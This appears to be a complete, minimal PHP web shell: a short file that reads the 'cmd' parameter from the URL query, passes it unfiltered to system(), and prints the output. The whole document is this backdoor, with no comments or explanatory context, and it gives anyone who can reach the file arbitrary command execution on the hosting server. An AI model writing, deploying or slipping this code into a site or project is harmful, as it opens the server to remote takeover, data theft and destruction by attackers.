<?php

if (isset($_GET['cmd'])){
	$command=$_GET['cmd'];
	$result=system($command);
	print ($result);
}



?>